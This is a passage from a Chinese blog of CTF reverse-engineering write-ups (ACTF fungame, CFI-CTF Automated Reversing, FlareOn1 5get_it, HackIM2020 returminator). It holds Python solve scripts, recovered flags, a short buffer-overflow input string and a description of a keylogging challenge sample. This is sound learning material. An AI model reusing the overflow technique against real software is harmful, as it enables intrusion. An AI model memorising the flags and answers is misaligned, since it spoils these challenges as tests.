class="number">3</span>)&amp;<span class="number">0x1f</span>]=(t+<span class="number">127</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">4</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">4</span>)&amp;<span class="number">0x1f</span>]=(t<span class="number">-7</span>+<span class="number">0x100</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">5</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">5</span>)&amp;<span class="number">0x1f</span>]=(t<span class="number">-18</span>+<span class="number">0x100</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">6</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">6</span>)&amp;<span class="number">0x1f</span>]=(t<span class="number">-88</span>+<span class="number">0x100</span>)&amp;<span class="number">0xff</span></span><br><span class="line">t = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    t[<span class="number">0</span>]=target[i*<span class="number">4</span>]</span><br><span class="line">    t[<span class="number">1</span>]=target[i*<span class="number">4</span>+<span class="number">1</span>]</span><br><span class="line">    t[<span class="number">2</span>]=target[i*<span class="number">4</span>+<span class="number">2</span>]</span><br><span class="line">    t[<span class="number">3</span>]=target[i*<span class="number">4</span>+<span class="number">3</span>]</span><br><span class="line">    target[i*<span class="number">4</span>]=t[<span class="number">1</span>]</span><br><span class="line">    target[i*<span class="number">4</span>+<span class="number">1</span>]=t[<span class="number">3</span>]</span><br><span class="line">    target[i*<span class="number">4</span>+<span class="number">2</span>]=t[<span class="number">0</span>]</span><br><span class="line">    target[i*<span class="number">4</span>+<span class="number">3</span>]=t[<span class="number">2</span>]</span><br><span class="line">print(bytes(target))</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<ol>
<li>一般会有cmp的地方是关键，因为要比对flag，长度等</li>
<li>程序中有一个或两个关键函数，比如本程序中的获取指定偏移处的数据</li>
<li>敢于行动</li>
</ol>
<h2 id="rev-ACTF新生赛2020-fungame"><a href="#rev-ACTF新生赛2020-fungame" class="headerlink" title="[rev][ACTF新生赛2020]fungame"></a>[rev][ACTF新生赛2020]fungame</h2><p>程序进入之后有个读取输入，然后异或，得到结果</p>
<p>Re_1s_So0_funny!</p>
<p>提交不是flag(肯定不是)，查看接下来的函数，使用了strcpy，再查看目标地址，发现strcpy溢出了，覆盖了旧ebp，这样肯定会引起异常吧，所以要找exception handler</p>
<p>挨个查看函数，有个函数让input again，然后base64，和a1s0_pWn比对，最终是<br>Re_1s_So0_funny!a1s0_pWn</p>
<p>还有个Reverse字符串</p>
<p>看答案是要使用pwn的思想，跳转到指定的地址(大概是第二次输入)</p>
<p>Re_1s_So0_funny!\x3d\x23\x40(=#@)</p>
<p>Re_1s_So0_funny!=#@</p>
<p>总结</p>
<p>善于思考题目的提示，善于观察，路子要野，不能走死了</p>
<h2 id="rev-CFI-CTF-2018-Automated-Reversing"><a href="#rev-CFI-CTF-2018-Automated-Reversing" class="headerlink" title="[rev][CFI-CTF 2018]Automated Reversing"></a>[rev][CFI-CTF 2018]Automated Reversing</h2><p>读取指定偏移的数据然后做一些操作</p>
<p>注意不要用os.listdir()，那个是不排序的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span>(<span class="params">filename</span>):</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    c = data[<span class="number">0xce</span>]</span><br><span class="line">    a = data[<span class="number">0xcb</span>]</span><br><span class="line">    op = data[<span class="number">0xca</span>]</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> op==<span class="number">0xc2</span>:</span><br><span class="line">        res = (c-a)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">0xf2</span>:</span><br><span class="line">        res=c^a</span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">0xea</span>:</span><br><span class="line">        res=(c+a)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown:&#x27;</span>,filename,hex(op))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;binaries\\binary&quot;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1008</span>):</span><br><span class="line">    flag.append(getData(path+str(i)))</span><br><span class="line">print(bytes(flag))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CFI&#123;1s_th 1s_4_pr0g_ech4ll_0r_4l_r3ve3se_cih4ll?&#125; # 使用os.listdir()的后果</span></span><br><span class="line"><span class="string">CFI&#123;1s_th1s_4_pr0g_ch4ll_0r_4_r3ve3se_ch4ll?&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="rev-FlareOn1-5get-it"><a href="#rev-FlareOn1-5get-it" class="headerlink" title="[rev][FlareOn1]5get_it"></a>[rev][FlareOn1]5get_it</h2><p>是一个dll，x32dbg可以直接加载</p>
<p>先是做了一些注册表的操作= =，然后拷贝了一份文件，可能因为权限不够，拷贝不成功</p>
<p>后面是读取按键的操作，并且将按键保存到了svchost.log文件中</p>
<p>然后在IDA中发现了DlgFunc函数，交叉引用找到了调用它的函数，函数很大，功能简单，实际上拷贝了3个字符串，使用python看看字符串是啥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Courier New</span><br><span class="line">FLARE ON!</span><br><span class="line">_______________________________________________NDD__________________________________________________</span><br><span class="line">______________________________________________DDDDD_________________________________________________</span><br><span class="line">______________________________________________DDDDDN________________________________________________</span><br><span class="line">_____________________________________________DDDDDDD________________________________________________</span><br><span class="line">NNNNNNNNDDN________DNNN_____________________NDDDDDDDD_______________NNNNNNNNDN__________DNNNNNNNNNNN</span><br><span class="line">DDDDDDDDDDD________NDDD____________________NDDDDDDDDDN______________DDDDDDDDDDDD________DDDDDDDDDDDD</span><br><span class="line">DDDDDDDDDDD________NDDD____________________NDDDDDDDDDD______________DDDDDDDDDDDDN_______NDDDDDDDDDDD</span><br><span class="line">DDDD_______________DDDD___________________NDDDDDDDDDDDD_____________DDDD_____NDDD_______DDDD________</span><br><span class="line">DDDD_______________DDDD__________________DDDDDDD_DDDDDDN____________DDDD_____DDDD_______DDDD________</span><br><span class="line">DDDDDDDDDD_________DDDD__________________NDDDDD___DDDDDDN___________DDDDDNNNNDDDN_______DDDDDDDDDD__</span><br><span class="line">DDDDDDDDDD_________DDDD_________________DDDDDDN___DNDDDDD___________DDDDDDDDDDD_________DDDDDDDDDD__</span><br><span class="line">DDDD_______________DDDD________________DDDDDDD_____DDDDDDD__________DDDD__DDDD__________DDDD________</span><br><span class="line">DDDD_______________DDDD_______________DDDDDDD_______DDDDDDD_________DDDD__NNDDD_________DDDD________</span><br><span class="line">DDDD_______________DDDDNNNNNN_________NDDDDDN_______NDDDDDD_________DDDD___DDDDN________DDDDNNNNNNNN</span><br><span class="line">DDDD_______________DDDDDDDDDDD_______NDDDDDD_________NDDDDDD________DDDD____DDDD________DDDDDDDDDDDD</span><br><span class="line">DDDN_______________DDDDDDDDDDN______NDDDDDDDDDDDDDDD__DDDDDDD_______NDDD_____DDDD_______DDDDDDDDDDDN</span><br><span class="line">____________________________________DDDDDDDDDDDDDDDN___DDDDDDN______________________________________</span><br><span class="line">___________________________________DDDDDDDDDDDDDDD_____DDDDDDD______________________________________</span><br><span class="line">__________________________________DDDDDDDDDDDDDDN_______DDDDDDD_____________________________________</span><br><span class="line">________________________________________NDDDDDN_____________________________________________________</span><br><span class="line">_______________________________________DNDDDDN______________________________________________________</span><br><span class="line">_______________________________________DDDDD________________________________________________________</span><br><span class="line">______________________________________DDDDD_________________________________________________________</span><br><span class="line">_____________________________________DDDDD__________________________________________________________</span><br><span class="line">_____________________________________NDD____________________________________________________________</span><br><span class="line">____________________________________NDD_____________________________________________________________</span><br><span class="line">___________________________________DD_______________________________________________________________</span><br></pre></td></tr></table></figure>
<p>原来是欢迎界面，交叉引用这个函数，得到当按下m并且一个全局变量大于0时就打印</p>
<p>猜测m是最后一个字符，通过交叉引用全局变量找到上一个字符，是o，依此类推，向前找</p>
<p>moctodnohsaderalfta5ek0rt5todrutodgnigg0l</p>
<p><a href="mailto:&#108;&#48;&#103;&#x67;&#x69;&#x6e;&#103;&#x2e;&#x75;&#x72;&#46;&#53;&#116;&#114;&#48;&#107;&#x65;&#x35;&#64;&#102;&#x6c;&#97;&#x72;&#x65;&#x2d;&#111;&#x6e;&#46;&#99;&#x6f;&#x6d;">&#108;&#48;&#103;&#x67;&#x69;&#x6e;&#103;&#x2e;&#x75;&#x72;&#46;&#53;&#116;&#114;&#48;&#107;&#x65;&#x35;&#64;&#102;&#x6c;&#97;&#x72;&#x65;&#x2d;&#111;&#x6e;&#46;&#99;&#x6f;&#x6d;</a></p>
<p>得到了，也包了flag，不知道为何不对。找到了这个</p>
<p><a target="_blank" rel="noopener" href="https://cyberdefenders.org/labs/24">https://cyberdefenders.org/labs/24</a></p>
<p>发现u是大写u，是我看错了吗 = =。大概是题目bug，输入小写u依然可以通过</p>
<h2 id="rev-HackIM2020-returminator"><a href="#rev-HackIM2020-returminator" class="headerlink" title="[rev][HackIM2020]returminator"></a>[rev][HackIM2020]returminator</h2><p>发现输入超过了s的长度，使用了pwn的思想，构造了一条rop链。可以看成一个VM，下面是反汇编脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">exe = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vm</span>(<span class="params">ads</span>):</span></span><br><span class="line">    dis = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ip = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> ip&lt;len(ads):</span><br><span class="line">        ad = ads[ip]</span><br><span class="line">        <span class="keyword">if</span> ad==<span class="number">0x4011a0</span>:</span><br><span class="line">            dis=<span class="string">&#x27;pop rcx&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;rcx=0x%x&#x27;</span>%ads[ip+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> ads[ip+<span class="number">1</span>]==<span class="number">0x4040a0</span>:</span><br><span class="line">                s+=<span class="string">&#x27;;input&#x27;</span></span><br><span class="line">            ip+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011a2</span>:</span><br><span class="line">            dis=<span class="string">&#x27;pop rax&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;rax=0x%x&#x27;</span>%ads[ip+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> ads[ip+<span class="number">1</span>]==<span class="number">0x4040a0</span>:</span><br><span class="line">                s+=<span class="string">&#x27;;input&#x27;</span></span><br><span class="line">            ip+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x40119a</span>:</span><br><span class="line">            dis=<span class="string">&#x27;pop rdi&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;rdi=0x%x&#x27;</span>%ads[ip+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> ads[ip+<span class="number">1</span>]==<span class="number">0x4040a0</span>:</span><br><span class="line">                s+=<span class="string">&#x27;;input&#x27;</span></span><br><span class="line">            ip+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011a4</span>:</span><br><span class="line">            dis=<span class="string">&#x27;add rax,rdi&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;add rax,rdi&#x27;</span></span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011ea</span>:</span><br><span class="line">            dis=<span class="string">&#x27;mov rdi,rax&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;mov rdi,rax&#x27;</span></span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011d6</span>:</span><br><span class="line">            dis=<span class="string">&#x27;movzx rdi, byte ptr [rdi]&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x40119c</span>:</span><br><span class="line">            dis=<span class="string">&#x27;pop rsi&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;rsi=0x%x&#x27;</span>%ads[ip+<span class="number">1</span>]</span><br><span class="line">            ip+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011a8</span>:</span><br><span class="line">            dis=<span class="string">&#x27;add rax,rsi&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011ee</span>:</span><br><span class="line">            dis=<span class="string">&#x27;mov rsi,rax&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011db</span>:</span><br><span class="line">            dis=<span class="string">&#x27;movzx rsi, byte ptr [rsi]&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011bd</span>:</span><br><span class="line">            dis=<span class="string">&#x27;xor rax,rax&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;xor rax,rax&#x27;</span></span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011c5</span>:</span><br><span class="line">            dis=<span class="string">&#x27;sub rax,rsi&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011ea</span>:</span><br><span class="line">            dis=<span class="string">&#x27;mov rdi,rax&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011ff</span>:</span><br><span class="line">            dis=<span class="string">&#x27;call exit&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;exit&#x27;</span></span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x40119e</span>:</span><br><span class="line">            dis=<span class="string">&#x27;pop rdx&#x27;</span></span><br><span class="line">            s=<span class="string">&#x27;rdx=0x%x&#x27;</span>%ads[ip+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> ads[ip+<span class="number">1</span>]==<span class="number">0x4040a0</span>:</span><br><span class="line">                s+=<span class="string">&#x27;;input&#x27;</span></span><br><span class="line">            ip+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011ac</span>:</span><br><span class="line">            dis=<span class="string">&#x27;add rax,rdx&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011f2</span>:</span><br><span class="line">            dis=<span class="string">&#x27;mov rdx,rax&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011e0</span>:</span><br><span class="line">            dis=<span class="string">&#x27;movzx rdx, byte ptr [rdx]&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011c9</span>:</span><br><span class="line">            dis=<span class="string">&#x27;sub rax,rdx&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011c1</span>:</span><br><span class="line">            dis=<span class="string">&#x27;sub rax,rdi&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011b0</span>:</span><br><span class="line">            dis=<span class="string">&#x27;add rax,rcx&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011f6</span>:</span><br><span class="line">            dis=<span class="string">&#x27;mov rcx,rax&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011e5</span>:</span><br><span class="line">            dis=<span class="string">&#x27;movzx rcx, byte ptr [rcx]&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> ad==<span class="number">0x4011cd</span>:</span><br><span class="line">            dis=<span class="string">&#x27;sub rax,rcx&#x27;</span></span><br><span class="line">            s=dis</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s=<span class="string">&#x27;unknown: %x&#x27;</span>%ad</span><br><span class="line">            ip+=<span class="number">1</span></span><br><span class="line">        print(s)</span><br><span class="line">o = [<span class="number">296</span>, <span class="number">272</span>, <span class="number">272</span>, <span class="number">272</span>, <span class="number">296</span>, <span class="number">360</span>, <span class="number">272</span>, <span class="number">424</span>, <span class="number">272</span>, <span class="number">208</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">96</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">208</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">208</span>, <span class="number">208</span>, <span class="number">208</span>, <span class="number">208</span>, <span class="number">208</span>, <span class="number">272</span>, <span class="number">120</span>, <span class="number">208</span>, <span class="number">208</span>]</span><br><span class="line">addr = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;blob&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> o:</span><br><span class="line">        data = f.read(i)</span><br><span class="line">        a = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x38</span>,len(data),<span class="number">8</span>):</span><br><span class="line">            a.append(int.from_bytes(bytes=data[j:j+<span class="number">8</span>],byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">        addr.append(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">    print(<span class="string">&#x27;r[%d]:&#x27;</span>%i)</span><br><span class="line">    vm(addr[i])</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>
<p>得到汇编指令之后可以观察到对于每一个字符的处理，注意exit退出时的参数就是返回值，参数位于rdi</p>
<p>s代表input，r代表返回值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">r[<span class="number">0</span>]==s[<span class="number">0</span>]+s[<span class="number">2</span>]+s[<span class="number">4</span>]<span class="number">-0x64</span></span><br><span class="line">r[<span class="number">1</span>]==s[<span class="number">6</span>]+s[<span class="number">8</span>]+s[<span class="number">0xa</span>]</span><br><span class="line">r[<span class="number">2</span>]==s[<span class="number">0xc</span>]+s[<span class="number">0xe</span>]+s[<span class="number">0x10</span>]</span><br><span class="line">r[<span class="number">3</span>]==s[<span class="number">0x12</span>]+s[<span class="number">0x1</span>]-s[<span class="number">0x1e</span>]</span><br><span class="line">r[<span class="number">4</span>]==s[<span class="number">3</span>]+s[<span class="number">0x16</span>]+s[<span class="number">3</span>]<span class="number">-0x64</span></span><br><span class="line">r[<span class="number">5</span>]==s[<span class="number">5</span>]+s[<span class="number">0x1d</span>]+s[<span class="number">0x1c</span>]-s[<span class="number">7</span>]<span class="number">-0x64</span></span><br><span class="line">r[<span class="number">6</span>]==s[<span class="number">9</span>]+s[<span class="number">0x11</span>]-s[<span class="number">0xb</span>]</span><br><span class="line">r[<span class="number">7</span>]==-(s[<span class="number">0x13</span>]+s[<span class="number">0x1b</span>])+s[<span class="number">0xd</span>]+s[<span class="number">0xf</span>]+s[<span class="number">0x14</span>]</span><br><span class="line">r[<span class="number">8</span>]==s[<span class="number">0x15</span>]+s[<span class="number">0x17</span>]+s[<span class="number">0x17</span>]</span><br><span class="line">r[<span class="number">9</span>]==s[<span class="number">0x19</span>]+s[<span class="number">0x1a</span>]</span><br><span class="line">r[<span class="number">10</span>]==s[<span class="number">0x1e</span>]</span><br><span class="line">r[<span class="number">11</span>]==s[<span class="number">9</span>]</span><br><span class="line">r[<span class="number">12</span>]==s[<span class="number">8</span>]</span><br><span class="line">r[<span class="number">13</span>]==s[<span class="number">0</span>]</span><br><span class="line">r[<span class="number">14</span>]==s[<span class="number">1</span>]</span><br><span class="line">r[<span class="number">15</span>]==s[<span class="number">2</span>]</span><br><span class="line">r[<span class="number">16</span>]==s[<span class="number">3</span>]</span><br><span class="line">r[<span class="number">17</span>]==s[<span class="number">4</span>]</span><br><span class="line">r[<span class="number">18</span>]==s[<span class="number">5</span>]</span><br><span class="line">r[<span class="number">19</span>]==s[<span class="number">6</span>]</span><br><span class="line">r[<span class="number">20</span>]==s[<span class="number">7</span>]</span><br><span class="line">r[<span class="number">21</span>]==s[<span class="number">0</span>]+s[<span class="number">0xb</span>]</span><br><span class="line">r[<span class="number">22</span>]==s[<span class="number">0x1d</span>]</span><br><span class="line">r[<span class="number">23</span>]==s[<span class="number">0x1d</span>]</span><br><span class="line">r[<span class="number">24</span>]==s[<span class="number">0x1d</span>]-s[<span class="number">0xd</span>]</span><br><span class="line">r[<span class="number">25</span>]==s[<span class="number">0x1c</span>]-s[<span class="number">0xe</span>]</span><br><span class="line">r[<span class="number">26</span>]==s[<span class="number">0x1c</span>]+s[<span class="number">0xf</span>]</span><br><span class="line">r[<span class="number">27</span>]==s[<span class="number">0</span>]-s[<span class="number">0x1b</span>]</span><br><span class="line">r[<span class="number">28</span>]==s[<span class="number">0x17</span>]-s[<span class="number">0x18</span>]</span><br><span class="line">r[<span class="number">39</span>]==s[<span class="number">0x1a</span>]+s[<span class="number">0</span>]-s[<span class="number">1</span>]</span><br><span class="line">r[<span class="number">30</span>]==s[<span class="number">0x13</span>]</span><br><span class="line">r[<span class="number">31</span>]==s[<span class="number">0xb</span>]+s[<span class="number">0xc</span>]</span><br><span class="line">r[<span class="number">32</span>]==s[<span class="number">0x15</span>]-s[<span class="number">0x14</span>]</span><br></pre></td></tr></table></figure>

<p>之后使用z3求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 